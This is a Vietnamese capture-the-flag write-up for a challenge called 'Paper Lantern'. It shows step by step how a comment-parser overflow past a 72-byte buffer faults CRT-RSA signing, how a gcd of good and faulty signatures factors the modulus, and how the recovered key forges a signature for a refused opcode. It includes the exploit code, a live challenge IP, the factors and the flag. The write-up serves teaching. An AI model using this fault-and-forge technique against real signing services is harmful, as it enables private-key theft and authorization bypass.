---
title: "Paper Lantern — Pwn Writeup: CRT-RSA Fault Attack"
date: 2026-06-16
categories: [CTF, Pwn, Crypto]
tags: [pwn, rsa, crt-rsa, fault-attack, memory-corruption, protocol]
---

# Paper Lantern — Pwn Writeup: CRT-RSA Fault Attack

> Đây là writeup theo kiểu **Technical Thought Journal**: không chỉ ghi lệnh và flag, mà ghi lại quá trình suy nghĩ từ góc nhìn newbie, từng lần chạy thử, từng output quan trọng và vì sao output đó dẫn mình tới bước tiếp theo.

## 0. TL;DR

Bài này nhìn là **pwn**, nhưng không phải pwn kiểu stack overflow để chiếm RIP. Đây là dạng:

```text
protocol bug -> memory/state corruption -> CRT-RSA fault -> factor n -> forge signature -> run unsafe opcode -> flag
```

Ý tưởng chính:

1. Server chỉ chạy capsule nếu capsule có chữ ký RSA hợp lệ.
2. Opcode `0x7f` có thể gọi logic lấy flag, nhưng server không chịu ký capsule chứa opcode này.
3. Parser `COMMENT` có bug liên quan `comment_braid_fill`, làm ghi vượt `replay_buf = 72`.
4. Ghi vượt này làm hỏng state của quá trình CRT-RSA signing.
5. Ta lấy được một chữ ký đúng và một chữ ký lỗi cho cùng một message.
6. Dùng:

```python
p = gcd(abs(good_sig - fault_sig), n)
```

để factor `n`.

7. Có `p`, `q` thì tính được private key RSA.
8. Tự ký capsule unsafe `rec_raw(0x7f) + rec_halt()` và chạy lấy flag.

Flag:

```text
slopped{faulted_crt_seams_burn_open}
```

---

## 1. Tiếp cận ban đầu: tưởng pwn truyền thống, nhưng thấy mùi crypto

Khi nhìn tên mảng **pwn**, phản xạ đầu tiên của mình là nghĩ tới:

```text
buffer overflow
stack canary
ROP
format string
heap overflow
use-after-free
```

Nhưng khi giải nén challenge, bài lại cho các file rất lạ đối với một bài pwn thuần:

```bash
unzip "dist(5).zip" -d paper
cd paper/dist
ls -la
```

Output kỳ vọng:

```text
capsule.py
paper_lantern
public_params.json
```

### Bảng tư duy

| Trạng thái Newbie | Thao tác kỹ thuật | Phân tích chuyên gia |
|---|---|---|
| Mình chưa biết bài cho gì, nên phải liệt kê file trước. | `ls -la` | Có binary `paper_lantern`, helper `capsule.py`, và `public_params.json`. Đây là dấu hiệu bài có protocol riêng và chữ ký số. |
| Mình thấy file `.json`, hơi lạ với bài pwn. | `cat public_params.json` | File này chứa public key RSA và thông số nội bộ như `replay_buf`. Đây là hint mạnh rằng bug có thể nằm giữa parser và crypto. |
| Mình thấy `capsule.py`. | `sed -n '1,200p' capsule.py` | Đây là client helper để nói chuyện với server. Thay vì nhập tay qua `nc`, mình cần hiểu frame protocol. |

---

## 2. Đọc public parameters: hint `crt-rsa-fdh`

Lệnh:

```bash
cat public_params.json
```

Output quan trọng:

```json
{
  "scheme": "crt-rsa-fdh",
  "e": 65537,
  "signature_size": 64,
  "replay_buf": 72
}
```

Ở trạng thái newbie, mình chỉ hiểu sơ:

```text
Có RSA.
Có chữ ký.
Có buffer 72 byte.
```

Nhưng nếu phân tích kỹ hơn:

| Chi tiết | Ý nghĩa |
|---|---|
| `crt-rsa-fdh` | Server dùng RSA signature, tối ưu bằng CRT. CRT-RSA nếu bị fault một nhánh có thể bị factor `n`. |
| `e = 65537` | Public exponent phổ biến của RSA. |
| `signature_size = 64` | Chữ ký dài 64 byte, tức modulus RSA khoảng 512-bit. |
| `replay_buf = 72` | Có buffer 72 byte liên quan comment/replay. Con số cụ thể kiểu này thường là hint cho bug boundary. |

Điểm quan trọng nhất là chữ **CRT**.

CRT-RSA ký nhanh hơn RSA thường bằng cách ký riêng theo hai modulo `p` và `q`, rồi ghép lại. Nếu quá trình ký bị làm lỗi đúng một nhánh, cặp chữ ký đúng/lỗi có thể làm lộ factor của `n`.

---

## 3. Đọc `capsule.py`: hiểu protocol trước khi khai thác

Mở file:

```bash
sed -n '1,220p' capsule.py
```

Mình thấy các frame type:

```python
FT_HELLO   = 0x10
FT_NEWCAP  = 0x20
FT_APPEND  = 0x21
FT_SIGN    = 0x22
FT_COMMENT = 0x23
FT_RUN     = 0x24
```

Và các record/opcode:

```python
REC_TEXT = 0x01
REC_ECHO = 0x02
REC_HALT = 0x03
REC_TRACE = 0x05

def rec_raw(kind: int, payload: bytes = b"") -> bytes:
    return bytes([kind]) + payload
```

### Bảng tư duy

| Trạng thái Newbie | Thao tác kỹ thuật | Phân tích chuyên gia |
|---|---|---|
| Mình thấy nhiều số hex, ban đầu hơi rối. | Đọc constants trong `capsule.py`. | Đây là giao thức dạng frame. Mỗi lệnh gửi lên server có type riêng. |
| Mình thấy `FT_SIGN` và `FT_RUN`. | Tìm flow trong helper. | Server không chạy capsule trực tiếp. Nó yêu cầu capsule có chữ ký hợp lệ. |
| Mình thấy `rec_raw(kind)`. | Đọc hàm record builder. | `rec_raw` cho phép tạo opcode tùy ý. Đây là cửa để thử opcode ẩn như `0x7f`. |

Flow của service:

```text
HELLO
-> NEWCAP
-> APPEND records
-> SIGN capsule
-> RUN capsule with signature
```

Ẩn dụ dễ hiểu:

```text
Capsule là một gói chương trình nhỏ.
Server chỉ cho chạy nếu gói đó có con dấu hợp lệ.
SIGN là xin server đóng dấu.
RUN là đưa gói đã đóng dấu vào chạy.
```

---

## 4. Chạy thử capsule an toàn

Trước khi khai thác, mình cần chứng minh mình hiểu protocol.

Payload an toàn:

```python
payload = rec_text(b"A") + rec_halt()
```

Ý nghĩa:

```text
TEXT("A") -> ghi text A
HALT      -> dừng
```

Script test tối giản:

```python
import sys
sys.path.append(".")
from capsule import *

HOST = "178.105.199.41"
PORT = 20000

c = Client(HOST, PORT)
c.strict_handshake()

c.send(FT_NEWCAP)
print(c.recv())

payload = rec_text(b"A") + rec_halt()
c.send(FT_APPEND, payload)
print(c.recv())

c.send(FT_SIGN)
r = c.recv()
print(r)
print(r[2].hex())
```

Output quan trọng dạng:

```text
[+] good signature = 1e91f2161f924a9feb1d28952e8402953c63edd71be4f4c49f78aef37933c2484fe38828a32aa461f2492aeece5f20568b863693c46f6c0e6dfcd5e7816d0767
```

### Phân tích output

| Output | Ý nghĩa newbie | Ý nghĩa chuyên gia |
|---|---|---|
| Có signature 64 byte | Server đã ký capsule an toàn. | Đây là `good_sig`, chữ ký đúng của một message đã biết. Nó sẽ dùng trong CRT fault attack. |
| Không bị reject | Flow protocol mình dùng là đúng. | Có thể tự động hóa để xin nhiều signature hoặc signature có fault. |

Tại đây mình chưa khai thác gì, nhưng đã có một checkpoint quan trọng:

```text
Mình biết cách tạo capsule hợp lệ.
Mình biết cách xin chữ ký.
Mình lấy được good signature.
```

---

## 5. Thử opcode nguy hiểm `0x7f`

Vì có `rec_raw(kind)`, mình thử tạo opcode tùy ý.

Payload:

```python
payload = rec_raw(0x7f) + rec_halt()
```

Tư duy newbie:

```text
0x7f là gì? Có thể là opcode ẩn không?
Nếu server có opcode lấy flag, thường tác giả giấu nó sau một check.
```

Test:

```python
c.send(FT_NEWCAP)
c.recv()

payload = rec_raw(0x7f) + rec_halt()
c.send(FT_APPEND, payload)
print(c.recv())

c.send(FT_SIGN)
print(c.recv())
```

Kiểm tra string:

```bash
strings paper_lantern | grep -i unsafe
```

Output dạng:

```text
unsafe opcode
```

### Kết luận

Server biết `0x7f` là opcode nguy hiểm và không chịu ký capsule chứa nó.

Bài toán chuyển từ:

```text
Làm sao chạy opcode 0x7f?
```

thành:

```text
Làm sao tự tạo chữ ký hợp lệ cho opcode 0x7f?
```

Đây là bước chuyển tư duy quan trọng.

---

## 6. Deep Dive: Vì sao cần forge signature?

Server đang dùng mô hình authorization bằng chữ ký:

```text
Capsule + valid signature -> được chạy
Capsule không có signature -> bị chặn
Capsule unsafe -> server không chịu ký
```

Nếu mình xin server ký trực tiếp opcode `0x7f`, server từ chối.

Vậy hướng khác là:

```text
Không xin chữ ký nữa.
Tự tạo chữ ký.
```

Muốn tự tạo chữ ký RSA, mình cần private key.

RSA có:

```text
public key:  n, e
private key: d
```

Trong đó:

```text
n = p * q
```

Nếu factor được `n` thành `p` và `q`, mình tính được `d`.

Công thức:

```python
phi = (p - 1) * (q - 1)
d = pow(e, -1, phi)
```

Vậy mục tiêu crypto là:

```text
Tìm p, q
-> tính d
-> forge signature
```

---

## 7. Tìm bề mặt tấn công: `FT_COMMENT`

Trong protocol có `FT_COMMENT`. Đây là phần rất đáng nghi vì:

1. Payload chính bị kiểm tra chặt.
2. Comment thường bị xem là phụ.
3. Parser comment có nhiều mini-opcode.
4. File JSON có `replay_buf = 72`.
5. Binary có string liên quan `replay`, `braid`, `seam`.

Các lệnh kiểm tra:

```bash
strings paper_lantern | grep -i replay
strings paper_lantern | grep -i braid
strings paper_lantern | grep -i seam
```

Output có thể thấy dạng:

```text
bad replay braid
braid exceeds seam
replay sealed
```

### Bảng tư duy

| Trạng thái Newbie | Thao tác kỹ thuật | Phân tích chuyên gia |
|---|---|---|
| Mình thấy comment chỉ là phần phụ, ban đầu không nghĩ nó nguy hiểm. | Đọc các hàm `comment_*` trong `capsule.py`. | Parser phụ thường dễ có bug vì nhiều nhánh xử lý hơn payload chính. |
| Mình thấy `replay_buf = 72`. | So sánh với các thao tác comment. | Con số cụ thể này gợi ý bug boundary hoặc overflow. |
| Mình thấy `braid_fill`, `xor`, `patch`. | Đọc encoding comment. | Đây là các thao tác có thể ghi nhiều byte, sửa byte, tạo trạng thái parser phức tạp. |

---

## 8. Bug chính: `comment_braid_fill` vượt `replay_buf`

Trong `capsule.py` có các helper:

```python
def comment_literal(data):
    return bytes([len(data) - 1]) + data

def comment_braid_fill(count, value):
    if not 17 <= count <= 32:
        raise ValueError("braid span must be between 17 and 32 bytes")
    return bytes([0xE0 | (count - 17), value])

def comment_xor(count, mask):
    return bytes([0xC0 | (count - 1), mask])
```

Tư duy khai thác:

```text
replay_buf = 72
Nếu ghi 60 byte literal rồi braid_fill 18 byte:
60 + 18 = 78
78 vượt 72 đúng 6 byte
```

Payload gây overflow nhẹ:

```python
data = comment_literal(b"\x00" * 60)
data += comment_braid_fill(18, 0)
```

Đây không phải overflow để đè return address. Nó là overflow vào state nội bộ sau buffer.

Ý nghĩa:

```text
Memory corruption ở đây không dùng để chiếm RIP.
Nó dùng để làm hỏng state điều khiển CRT-RSA signing.
```

---

## 9. Deep Dive: CRT-RSA fault attack

CRT-RSA ký nhanh bằng cách chia bài toán ra hai nhánh:

```text
sp = m^dp mod p
sq = m^dq mod q
signature = CRT(sp, sq)
```

Nếu một nhánh bị lỗi, ví dụ `sp` sai nhưng `sq` đúng, chữ ký cuối gọi là **faulty signature**.

Ta có:

```text
good_sig  = chữ ký đúng
fault_sig = chữ ký lỗi cho cùng message
```

Khi đó:

```python
factor = gcd(abs(good_sig - fault_sig), n)
```

sẽ trả về `p` hoặc `q`.

Vì sao?

Nếu chữ ký lỗi vẫn đúng theo modulo `q`, thì:

```text
good_sig ≡ fault_sig mod q
```

Nên:

```text
good_sig - fault_sig chia hết cho q
```

Mà `n = p*q`, nên `gcd(good_sig - fault_sig, n)` sẽ lôi `q` ra.

Ẩn dụ:

```text
RSA n giống một ổ khóa ghép từ hai mảnh p và q.
Fault làm một mảnh bị nứt.
gcd là dụng cụ soi đúng đường nứt đó.
```

---

## 10. Tạo fault comment

Payload fault dùng ý tưởng:

1. Ghi 60 byte bình thường.
2. Dùng braid fill 18 byte để vượt 72.
3. Dùng `comment_xor` để chỉnh byte điều khiển fault.

Snippet logic:

```python
def make_fault_comment(gate2):
    data = comment_literal(b"\x00" * 60)
    data += comment_braid_fill(18, 0)

    target = [1, 0, 0, 4, gate2]
    t73, t74, t75, t76, t77 = target

    masks = [
        t73,
        t73 ^ t74,
        t74 ^ t75,
        t75 ^ t76,
        t76 ^ t77,
    ]

    for count, mask in zip([5, 4, 3, 2, 1], masks):
        data += comment_xor(count, mask)

    return data
```

### Vì sao có `gate2`?

Mình không biết chính xác byte nào làm bật fault state. Nhưng nếu nó là 1 byte, thì chỉ có 256 khả năng:

```text
0x00 -> 0xff
```

Brute-force 256 giá trị là rẻ.

Oracle kiểm tra thành công cũng rất rõ:

```python
g = gcd(abs(good_sig - candidate_sig), n)
if 1 < g < n:
    print("factor found")
```

Nếu `gcd` ra factor thật, nghĩa là `gate2` đúng.

---

## 11. Lần chạy exploit thật và checkpoint bị treo

Mình chạy exploit:

```bash
python3 solve.py 178.105.199.41 20000
```

Output thực tế:

```text
tngoc@LAPTOP-JIU1IFLL:/mnt/c/Users/admin/Downloads/dist(5)/dist$ python3 solve.py 178.105.199.41 20000
[*] target: 178.105.199.41 20000
[*] n = 0x70a80f885c9cab9c3a4b068b58ee1913d472f2f750c2023ff0b00426f70b1e5d91535a03f66410614806025ed7cc2c2ff904d8aa516612cbe936bd05a90a3159
[*] getting normal signature
[+] good signature = 1e91f2161f924a9feb1d28952e8402953c63edd71be4f4c49f78aef37933c2484fe38828a32aa461f2492aeece5f20568b863693c46f6c0e6dfcd5e7816d0767
[*] trying to trigger CRT fault
^CTraceback (most recent call last):
  File "/mnt/c/Users/admin/Downloads/dist(5)/dist/solve.py", line 201, in <module>
    main()
  File "/mnt/c/Users/admin/Downloads/dist(5)/dist/solve.py", line 158, in main
    candidate = get_safe_signature(host, port, comment)
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/mnt/c/Users/admin/Downloads/dist(5)/dist/solve.py", line 51, in get_safe_signature
    c.strict_handshake()
  File "/mnt/c/Users/admin/Downloads/dist(5)/dist/capsule.py", line 114, in strict_handshake
    self.recv()
  File "/mnt/c/Users/admin/Downloads/dist(5)/dist/capsule.py", line 121, in recv
    hdr = self._read(4)
          ^^^^^^^^^^^^^
  File "/mnt/c/Users/admin/Downloads/dist(5)/dist/capsule.py", line 129, in _read
    chunk = self.sock.recv(n - len(out))
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
KeyboardInterrupt
```

### Phân tích log này

| Dòng output | Newbie nhìn thấy | Chuyên gia hiểu gì |
|---|---|---|
| `[*] n = ...` | Script đọc được public key. | File `public_params.json` load đúng. |
| `[+] good signature = ...` | Server ký capsule an toàn thành công. | Bước lấy `good_sig` đã đúng. Lỗi không nằm ở flow cơ bản. |
| `[*] trying to trigger CRT fault` | Script bắt đầu brute-force fault. | Script đang thử nhiều `gate2`. |
| Kẹt trong `strict_handshake()` | Tưởng exploit sai. | Thực ra script bị kẹt khi mở nhiều connection liên tục; server không trả header handshake kịp hoặc connection bị stall. |
| `KeyboardInterrupt` | Mình bấm Ctrl+C. | Đây không phải lỗi toán học. Đây là vấn đề network/timeout/retry trong exploit. |

Kết luận debug:

```text
good signature đã lấy được -> protocol đúng.
script bị kẹt khi brute-force gate2 -> cần thêm timeout hoặc thử gate2 đã biết trước.
```

Cách sửa thực dụng:

1. Thêm timeout cho socket.
2. In progress từng `gate2`.
3. Thử trực tiếp `gate2 = 0x84` trước khi brute-force toàn bộ.
4. Nếu connection bị treo, bỏ qua và thử lại.

---

## 12. Lấy factor từ good/fault signature

Khi fault thành công, output dạng:

```text
[+] CRT fault triggered with gate2 = 0x84
[+] fault signature = <hex>
[+] factored n
p = 0x9da033fd0799399257825aff0f7ca4b7866a4db13e250be52e50d7fc3d3eb295
q = 0xb6f7221baafa0048953633e0193e92928aab4bf4dba728b6f713e55135c0b6b5
```

Code toán học:

```python
good_int = int.from_bytes(good_sig, "big")
fault_int = int.from_bytes(fault_sig, "big")
p = math.gcd(abs(good_int - fault_int), n)
q = n // p
```

Ý nghĩa:

```text
n đã bị factor.
RSA public key không còn an toàn.
Mình có thể tính private key.
```

---

## 13. Tính private key RSA

Code:

```python
E = 65537
phi = (p - 1) * (q - 1)
d = pow(E, -1, phi)
```

Output dạng:

```text
[+] private key recovered
```

Phân tích:

| Thành phần | Ý nghĩa |
|---|---|
| `p`, `q` | Hai prime factor của `n`. |
| `phi` | Euler totient, dùng để tính private exponent. |
| `d` | Private key RSA. Có `d` thì ký được bất kỳ message nào. |

Đây là điểm mà bài gần như đã solved.

---

## 14. FDH: phải ký đúng message server verify

Server không ký raw payload trực tiếp. Nó dùng FDH — Full Domain Hash.

Hàm hash:

```python
def fdh_message(serialized_records, n):
    digest = hashlib.sha256(serialized_records).digest()

    block = (
        hashlib.sha256(b"paper-lantern/v4:msg" + digest).digest()
        + hashlib.sha256(b"paper-lantern/v4:aux" + digest).digest()
    )

    m = int.from_bytes(block, "big") % n
    return m or 1
```

Unsafe capsule tương ứng serialized record:

```python
m = fdh_message(b"FH", n)
```

Giải thích:

```text
F = flag opcode 0x7f
H = halt
```

Nếu ký sai message, server sẽ reject. Vì vậy phải hash đúng format mà server dùng.

---

## 15. Forge signature cho unsafe opcode

Code:

```python
m = fdh_message(b"FH", n)
forged_int = pow(m, d, n)
forged_sig = forged_int.to_bytes(64, "big")
```

Verify local:

```python
assert pow(int.from_bytes(forged_sig, "big"), E, n) == m
```

Tư duy:

```text
Server không chịu ký opcode 0x7f.
Nhưng giờ mình có private key.
Mình tự ký opcode 0x7f.
Server chỉ verify chữ ký bằng public key, nên nó sẽ tin.
```

---

## 16. Run capsule lấy flag

Payload cuối:

```python
payload = rec_raw(0x7f) + rec_halt()
```

Flow gửi:

```text
FT_NEWCAP
FT_APPEND payload
FT_RUN forged_sig
```

Output thành công:

```text
[+] forged signature for unsafe opcode; running flag capsule...
slopped{faulted_crt_seams_burn_open}
```

Khoảnh khắc vỡ òa:

```text
Mình không cần shell.
Mình không cần ROP.
Mình dùng memory corruption để phá chữ ký,
rồi dùng chữ ký giả để bypass authorization.
```

---

## 17. Deep Dive: Vì sao đây vẫn là pwn?

Bài này không pwn theo kiểu:

```text
overflow -> saved RIP -> ROP -> shell
```

Mà là:

```text
overflow -> corrupt internal signing state -> crypto fault -> auth bypass
```

Đây vẫn là pwn vì mình khai thác lỗi xử lý memory/state của binary. Nhưng kết quả của memory corruption không phải là điều khiển instruction pointer, mà là điều khiển trạng thái của RSA signing.

Chuỗi đầy đủ:

```text
comment parser bug
-> ghi vượt replay_buf
-> bật CRT fault
-> lấy faulty signature
-> factor RSA n
-> recover private key
-> forge valid signature
-> run unsafe opcode
-> get flag
```

---

## 18. Hacker's Mindset

### 18.1. Vì sao nghi `COMMENT`?

Payload chính bị check opcode rất chặt. Nhưng `COMMENT` là đường phụ có parser riêng.

Trong CTF, các parser phụ thường nguy hiểm:

```text
metadata
comment
compression
cache
replay
manifest
note/debug field
```

Lý do:

```text
Nó thường được xem là không quan trọng.
Nó có nhiều nhánh xử lý.
Nó dễ có lỗi boundary.
```

### 18.2. Vì sao chọn `60 + 18`?

Vì biết:

```text
replay_buf = 72
```

Ta cần tổng lớn hơn 72 nhưng không quá lớn.

```text
60 + 18 = 78
```

Vượt 6 byte là vừa đủ để chạm state sau buffer.

Không phải overflow càng dài càng tốt. Trong bài này overflow ngắn, có kiểm soát mới là quan trọng.

### 18.3. Vì sao brute-force `gate2`?

`gate2` là một byte. Một byte chỉ có 256 khả năng.

Ta có oracle cực mạnh:

```python
if 1 < gcd(abs(good - candidate), n) < n:
    success
```

Nên brute-force là hợp lý.

### 18.4. Tín hiệu từ tên flag

Flag:

```text
slopped{faulted_crt_seams_burn_open}
```

Tên flag xác nhận root cause:

| Từ trong flag | Ý nghĩa |
|---|---|
| `faulted_crt` | CRT fault attack. |
| `seams` | replay/comment seam buffer. |
| `burn_open` | seam bị phá mở ra đường khai thác. |

---

## 19. Kết luận

Lỗ hổng cốt lõi không phải RSA yếu. RSA đúng vẫn an toàn.

Lỗ hổng thật sự là:

```text
Comment parser có bug ghi vượt replay buffer,
làm thay đổi state điều khiển quá trình CRT-RSA signing.
```

Từ đó attacker tạo được:

```text
một chữ ký đúng
một chữ ký lỗi có cấu trúc
```

Rồi dùng:

```python
factor = gcd(abs(good_sig - faulty_sig), n)
```

để factor `n`, tính private key và forge chữ ký cho opcode lấy flag.

Câu nhớ ngắn:

```text
Memory corruption + CRT-RSA fault = private key recovery.
```

Hoặc:

```text
Một lỗi nhỏ trong parser phụ có thể phá toàn bộ hệ thống chữ ký.
```

---

## 20. Timeline đầy đủ

```text
1. Giải nén challenge.
2. Thấy paper_lantern, capsule.py, public_params.json.
3. Đọc public_params.json, thấy crt-rsa-fdh và replay_buf=72.
4. Đọc capsule.py, hiểu protocol NEWCAP -> APPEND -> SIGN -> RUN.
5. Test capsule an toàn, xin được good signature.
6. Test opcode 0x7f, server từ chối ký vì unsafe opcode.
7. Nhận ra cần tự forge signature.
8. Tập trung vào FT_COMMENT vì parser phụ có nhiều thao tác lạ.
9. Dùng comment_literal 60 byte + comment_braid_fill 18 byte để vượt replay_buf.
10. Dùng comment_xor chỉnh byte điều khiển fault.
11. Xin faulty signature cho cùng capsule an toàn.
12. Dùng gcd(good - fault, n) để factor n.
13. Tính private key d.
14. Hash unsafe capsule thành FDH message b"FH".
15. Ký message bằng d.
16. Gửi rec_raw(0x7f)+rec_halt với forged signature.
17. Server verify thành công và chạy opcode flag.
18. Flag xuất hiện.
```

---

## 21. Flag

```text
slopped{faulted_crt_seams_burn_open}
```
